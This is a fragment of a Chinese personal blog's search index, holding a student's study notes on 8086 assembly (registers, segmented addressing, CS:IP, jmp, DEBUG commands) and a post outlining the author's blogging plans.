class="line">就是拿来临时保存东西的</span><br><span class="line">大概就是用来封装函数</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.我们可以将一段内存定义为一个段，用一个段地址来指示段，用偏移地址访问段内的单元。【这完全是我们的安排】</p><p>2.我们可以用一个段存放数据，将它定义成“数据段”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DS:[]</span><br><span class="line">CPU就将我们定义的数据段中的内容当作数据来访问</span><br><span class="line">比如mov add sub </span><br></pre></td></tr></table></figure><p>我们可以用一个段存放代码，将它定义成“代码段”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS:IP</span><br><span class="line">CPU就将执行我们定义的代码段中的指令</span><br></pre></td></tr></table></figure><p>我们可以用一个段当作  栈，将它定义成“栈段”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SS:SP</span><br><span class="line">CPU在需要进行栈操作的时候，执行PUSH POP 指令的时候，就将我们定义的栈段当作栈空间来使用</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-寄存器-CPU互作原理（2）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-2-%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU%E4%BA%92%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-2-%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU%E4%BA%92%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="CPU概述"><a href="#CPU概述" class="headerlink" title="CPU概述"></a>CPU概述</h2><p>1.一个典型的CPU由运算器，控制器，寄存器等器件组成，这些器件靠内部的总线相连</p><p>2.区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内部总线：是CPU内部的【用于运算器，控制器，寄存器】</span><br><span class="line">外部总线：是我们之间学的那些【用于和主板联系的--&gt;地址总线，数据总线，控制总线】</span><br></pre></td></tr></table></figure><p>3.内部总线实现CPU内部各个器件之间的联系</p><p>4.外部总监实现CPU和主板上其他器件的联系</p><h2 id="寄存器概述"><a href="#寄存器概述" class="headerlink" title="寄存器概述"></a>寄存器概述</h2><p>1.8086CPU有14个寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-1通用寄存器"><a href="#2-1通用寄存器" class="headerlink" title="2.1通用寄存器"></a>2.1通用寄存器</h3><p>1.8086CPU所有的寄存器都是16位的，可以存放2个字节，也就是一个字</p><p>2.AX  BX  CX  DX  通常用来存放一般性数据被称为通用寄存器</p><p>3.AX</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230405132751383.png" alt="image-20230405132751383"></p><p>一个16位寄存器可以存储一个16位的数据</p><p>比如：数据18  –&gt; 二进制表示是10010</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230405132946340.png" alt="image-20230405132946340">  </p><p>一个16位寄存器所能存储的数据的最大值是多少呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2^16 - 1   --&gt;  二进制就是1111,1111,1111,1111</span><br></pre></td></tr></table></figure><p>4.为了保持和上一代CPU中的寄存器【都是8位】的兼容性，这4个寄存器可以分为2个独立的8位寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AX--&gt;AH AL  [high low]</span><br><span class="line">AL:0~7位</span><br><span class="line">AH:8~15位</span><br><span class="line">AL 和 AH 是可以独立使用的8位寄存器</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230405133854304.png" alt="image-20230405133854304"></p><h3 id="2-2字在寄存器中的储存"><a href="#2-2字在寄存器中的储存" class="headerlink" title="2.2字在寄存器中的储存"></a>2.2字在寄存器中的储存</h3><p>1.一个字可以存放一个16位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高8位和低8位寄存器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字 --&gt; word</span><br><span class="line">1word=2Byte=16bit</span><br></pre></td></tr></table></figure><h4 id="关于数制的讨论"><a href="#关于数制的讨论" class="headerlink" title="关于数制的讨论"></a>关于数制的讨论</h4><p>1.由于1个内存单元可以放8位数据，CPU中的寄存器又可放N个8位数据。也就是说，计算机中的数据大多是由1~N个8位数据构成的。【进制转换的课程，有时间一定要去看啊】</p><p>2.用十六进制来表示数据可以直观的看出这个数据是由那些8位数据构成【每两位对应一个八进制】【4位对应一个16进制】</p><p>3.十六进制后面+H ； 二进制后面+B ； </p><h3 id="2-3几条汇编指令"><a href="#2-3几条汇编指令" class="headerlink" title="2.3几条汇编指令"></a>2.3几条汇编指令</h3><p>1.汇编的指令是不分大小写的</p><p>汇编指令                                控制CPU完成的操作                                        高级语言的写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">move ax,18将18送入AXAX=18</span><br><span class="line">move ah,78将78送入AHAH=78</span><br><span class="line">add ax,8将寄存器AX中的值加上8AX=AX+8</span><br><span class="line">move ax,bx将寄存器BX中的数据送入寄存器AX中AX=BX</span><br><span class="line">add ax,bx将AX,BX中的内容相加，结果存在AX中AX=AX+BX</span><br><span class="line"></span><br><span class="line">在使用add的时候如果存放的数值大于了寄存器的容量怎么办？</span><br><span class="line">AX寄存器就存放2个字节，取后面的，前面的舍去掉（舍去的部分取哪里了，后面再说）</span><br><span class="line">比如：mov ax,8226H    mov bx,8226H</span><br><span class="line">add ax,bx</span><br><span class="line">这个时候的ax中的值是044cH</span><br><span class="line">但是8226H+8226H=1044c的，前面的1被抛弃</span><br><span class="line">同理：如果使用的是AL或者AH，虽然这俩个是AX分出来，但是在AL溢出的时候，也是只能放后面的</span><br><span class="line"></span><br><span class="line">比如AX中的值是00C5H</span><br><span class="line">add al,93H     ------&gt; c5+93=158 </span><br><span class="line">最后得出的AX的值是0058H</span><br></pre></td></tr></table></figure><p>**这里的丢失，指的是进制不能再8位寄存器中保存，但是CPU不是真正的抛弃这个进制位</p><h3 id="2-4物理地址"><a href="#2-4物理地址" class="headerlink" title="2.4物理地址"></a>2.4物理地址</h3><p>1.CPU访问内存单元时要给出内存单元的地址。所有的内存单元构成了存储空间是一个一维的线性空间</p><p>2.我们将这个唯一的地址称为物理地址</p><h3 id="2-6-16位结构的CPU"><a href="#2-6-16位结构的CPU" class="headerlink" title="2.6 16位结构的CPU"></a>2.6 16位结构的CPU</h3><p>1.概括的讲，16位结构描述了一个CPU具有一下几个方面的特征</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.运算器一次最多可以处理16位的数据</span><br><span class="line">2.寄存器的最大宽度是16位</span><br><span class="line">3.寄存器和运算器之间的通路是16位的</span><br></pre></td></tr></table></figure><p>2.8086CPU给出物理地址的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.8086有20位地址总线，可传送20位地址，寻址能力是1M</span><br><span class="line">2.8086内部为16位结构，它只能传送16位的地址，表现出的寻址能力却只有64K</span><br></pre></td></tr></table></figure><p>3.问题：那么，8086CPU如何用内部16位的数据转化成20位的地址呢?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">8086CPU采用一种再内部用俩个16位地址合成的方法形成一个20位的物理地址</span><br><span class="line"></span><br><span class="line">1.CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址</span><br><span class="line">2.段地址和偏移地址通过内部总线送入一个称为地址加法器的部件；</span><br><span class="line">3.地址加法器将两个16位地址合并成一个20位的地址</span><br><span class="line">4....</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230405175513882.png" alt="image-20230405175513882"></p><h3 id="2-7地址加法器的互作原理"><a href="#2-7地址加法器的互作原理" class="headerlink" title="2.7地址加法器的互作原理"></a>2.7地址加法器的互作原理</h3><p>问题：地址加法器的互作原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址加法器合成物理地址的方法：</span><br><span class="line">物理地址=段地址*16+偏移地址</span><br></pre></td></tr></table></figure><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230405180149132.png" alt="image-20230405180149132"></p><p>5.由段地址* 16引发的血案….</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">段地址*16 ==&gt; 有一个更常用的说法，就是数据左移4位（二进制位）</span><br><span class="line">移位位数二进制十六进制  十进制</span><br><span class="line">010B2H2</span><br><span class="line">1100B4H4</span><br><span class="line">21000B8H8</span><br><span class="line">310000B10H16</span><br><span class="line">4100000B20H32</span><br></pre></td></tr></table></figure><p>通过观察我们发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.一个数据的二进制[16进制]形式左移1位，相当于该数*2[*16]</span><br><span class="line">2.一个数据的二进制形式左移N位，相当于该数*2的N次方</span><br><span class="line">3.所以段地址*16的运算就是，以二进制形式存放的段地址左移4位</span><br></pre></td></tr></table></figure><p>段地址*16+偏移地址=物理地址的本质含义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.基础地址+偏移地址=物理地址</span><br><span class="line">2.段地址*16+偏移地址=物理地址</span><br><span class="line">就是说CPU一次只能提供不够的，第一个地址进行*16后加上去就是物理地址</span><br></pre></td></tr></table></figure><h3 id="2-8段的概念"><a href="#2-8段的概念" class="headerlink" title="2.8段的概念"></a>2.8段的概念</h3><p>1.错误的认识</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内存被划分成了一个一个的段，没一个段有一个段地址</span><br></pre></td></tr></table></figure><p>2.其实</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内存并没有分段，段的划分来自于CPU，由于8086CPU“用（段地址*16）+偏移地址=物理地址”的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存</span><br></pre></td></tr></table></figure><p>3.以后在编程的时候，将若干个连续的内存单元看作一个段，用段地址*16 定位段的起始地址（基础地址）用偏移地址定位段中的内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.段地址*16必然十16的倍数，所以一个段的起始地址也一定是16的倍数</span><br><span class="line">2.偏移地址为16位，16位地址的寻址能力为64K,所以一个段的长度最大是64K</span><br></pre></td></tr></table></figure><h3 id="内存单元地址小结"><a href="#内存单元地址小结" class="headerlink" title="内存单元地址小结"></a>内存单元地址小结</h3><p>1.CPU访问内存单元的时候，必须向内存提供内存单元的物理地址</p><p>2.8086CPU在内部用段地址和偏移地址移位相加的方法形成最终的物理地址。</p><p>3.一个物理地址，可以由很多种段地址和偏移地址形成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>4.给定一个段地址，仅通过变化偏移地址来寻，最多可以定位64KB个内存单元</p><h3 id="没有小结的小结"><a href="#没有小结的小结" class="headerlink" title="没有小结的小结"></a>没有小结的小结</h3><p>1.段地址和偏移地址</p><p>2.数据在21F60H内存单元中。对于8086PC机中有俩种描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.数组存在内存2000:1F60单元种</span><br><span class="line">2.数据存在内存的2000段种的1F60H单元种</span><br></pre></td></tr></table></figure><p>3.可以根据需要，将地址连续，起始地址为16的位数的一组内存单元定义为一个段</p><h3 id="2-9段寄存器"><a href="#2-9段寄存器" class="headerlink" title="2.9段寄存器"></a>2.9段寄存器</h3><p>1.段寄存器就是提供段地址的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8086CPU有4个段寄存器</span><br><span class="line">CS  DS  SS  ES </span><br></pre></td></tr></table></figure><p>2.当8086CPU要访问内存时，由这四个段寄存器提供内存单元的段地址</p><h3 id="2-10CS和IP"><a href="#2-10CS和IP" class="headerlink" title="2.10CS和IP"></a>2.10CS和IP</h3><p>1.CS和IP是8086CPU中最关键的寄存器，它们指示了CPU当前要读取指令的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS为代码段寄存器</span><br><span class="line">IP为指令指针寄存器【偏移地址的寄存器】</span><br></pre></td></tr></table></figure><p>2.8086PC互作过程的简要描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲区；</span><br><span class="line">2.IP=IP+所读取指令的长度，从而指向下一条指令</span><br><span class="line">3.执行指令。转到步骤1</span><br></pre></td></tr></table></figure><p>3.在任何时候，CPU和CS,IP中的内容当作指令的段地址和偏移地址，用它们合成指令的物理地址，到内存中读取指令码，执行</p><p>4.如果说，内存中的一段信息被CPU执行过的话，那么，它所在的内存单元必然是被CS:IP指向过</p><h3 id="2-11修改CS-IP的指令"><a href="#2-11修改CS-IP的指令" class="headerlink" title="2.11修改CS,IP的指令"></a>2.11修改CS,IP的指令</h3><p>1.在CPU中，程序员能够用指令读写的部件只有寄存器，程序员可以通过改变寄存器中的内容实现对CPU的控制</p><p>2.CPU从何处执行指令是由CS,IP中的内容决定的，程序员可以通过改变CS,IP中的内容来控制CPU执行目标指令</p><p>3.同时修改CS.IP的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp 段地址:偏移地址</span><br><span class="line">jmp 2AE3:3   --&gt; 3AE33</span><br><span class="line">jmp 3:OB16   --&gt; 0003</span><br><span class="line">功能：用指令中给出的地段修改CS,偏移地址修改IP</span><br></pre></td></tr></table></figure><p>4.只修改IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jim 某一个合法寄存器完成：</span><br><span class="line">jmp ax 指令执行前：ax=1000H CS=2000H,IP=0003H</span><br><span class="line"> 后：ax=1000H CS=2000H,IP=1000H</span><br><span class="line">这个就是类似于：mov IP,ax</span><br></pre></td></tr></table></figure><h3 id="2-12代码段"><a href="#2-12代码段" class="headerlink" title="2.12代码段"></a>2.12代码段</h3><p>1.对于8086PC机，在编程的时候，可以根据需要，将一组内存单元定义为一个段</p><p>2.可以将长度为N(N&lt;=64KB)的一组代码，存在一组地址连续，起始地址为16的倍数的内存单元中，这段内存是用来存放代码的，从而定义了一个代码段</p><p>3.如何使得代码段中的指令被执行呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用CS:IP指过去</span><br></pre></td></tr></table></figure><p>4.将一段内存当作代码段，仅仅是我们在编程时的一种安排，CPU并不会由于这种安排，就自动的将我们定义的代码段中的指令当作指令来执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CPU只认被CS:IP指向的内存单元中的内容为指令</span><br><span class="line">如果是其他的来指向就可能是数据</span><br></pre></td></tr></table></figure><p>5.所以要将CS:IP指向对应的地址</p><h3 id="2-9-2-12节的小结"><a href="#2-9-2-12节的小结" class="headerlink" title="2.9~2.12节的小结"></a>2.9~2.12节的小结</h3><p>1.段地址在8086CPU的寄存器中存放。当8086CPU要访问内存的时候，由段寄存器提供内存单元的段地址。8086CPU有4个段寄存器，其中CS用来存放指令的段地址</p><p>2.CS存放指令的段地址，IP存放指令的偏移地址。</p><p>3.8086机中，任意时刻，CPU将CS:IP指向的内容当作指令执行</p><p>4.8086CPU的互作过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.从CS:IP指向内存单元读取指令，读取的指令进入缓冲区</span><br><span class="line">2.IP指向下一条指令；</span><br><span class="line">3.执行指令（转到步骤1）</span><br></pre></td></tr></table></figure><p>5.8086CPU提供转移指令修改CS,IP的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp</span><br></pre></td></tr></table></figure><h2 id="实验【完成就结束第二章】"><a href="#实验【完成就结束第二章】" class="headerlink" title="实验【完成就结束第二章】"></a>实验【完成就结束第二章】</h2><p>1.查看CPU和内存，用机器指令和汇编指令编程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用到DEBUG</span><br><span class="line">cmd--&gt;输入debug</span><br></pre></td></tr></table></figure><p>什么是debug？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debug是DOS，Windows都提供的实模式（8086方式）程序的调试工具，使用它可以查看CPU各种寄存器中的内容，内存的情况和在机器码级跟踪程序的运行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">指令：</span><br><span class="line">-r查看，改变CPU寄存器的内容</span><br><span class="line">-d查看内容中的内容</span><br><span class="line">-e改写内存中的内容</span><br><span class="line">-u将内存中的机器指令翻译成汇编指令</span><br><span class="line">-t命令执行一条机器指令</span><br><span class="line">-a以汇编指令的格式在内容中写入一条机器指令</span><br></pre></td></tr></table></figure><p>这里还是去看视频吧P12</p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>张明宇的博客计划</title>
      <link href="/2023/04/30/%E8%AE%A1%E5%88%92/"/>
      <url>/2023/04/30/%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<p><strong>为了监督我的学习和记录我的成长，我的博客计划是：</strong></p><p>一周一小更，一个月一大更。每周天晚上写一写最近的学习情况和内容【可以是几个字也能是几百字】。每一个月写一个收获到的知识内容，或者这一个月所得到的东西。</p><ul><li><p>会开放一个计划想法区：把突发奇想的东西都放上去。</p></li><li><p>会开放一个娱乐区：用来记录我学后的放松娱乐。</p></li><li><p>会开放一个日常笔记区：把写的笔记都上传到一个地方，并且把不同的笔记内容进行分类。【该功能还在探索】【因为是刚刚开始学，所以很多笔记可能有不当之处】</p></li><li><p>会开放一个汽车展览区：帅气的汽车都放上去。</p></li><li><p>会开放一个剪辑区：把酷酷的视频和美美的视频放上去。</p></li><li><p>由于我对渗透测试和二进制安全都蛮有兴趣的，加上我还年轻【才大一，刚刚接触这个网络】所以我可能两个方向都会学一学，在未来的日子里定下专攻的方向。</p></li><li><p>因为是才刚刚搭建起来的博客，很多地方都不很懂，并且有很多的东西都还未能开放【还不太会】。所以请大家多给建议，谢谢。</p></li></ul><p><strong>以前浪费的时间太多，希望我能在搭建该博客后能自觉，自立的进行学习。</strong></p><ul><li>只要即可起步，永远都不会嫌迟。</li><li>细节决定成败，习惯成就未来。</li></ul><p><strong>来自皮皮虾的正能量</strong>【简单的记录一下神评，下次我也能神评啦~】</p><ul><li>聪明是一种天赋，而善良是一种选择。</li><li>保持求同存异，不要带有知识上的优越感。</li><li>你在背后议论我，说明我走在你前面。</li></ul><p>注：现在的背景图不符合我的审美，我后面会把我的“海贼王”放上去。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
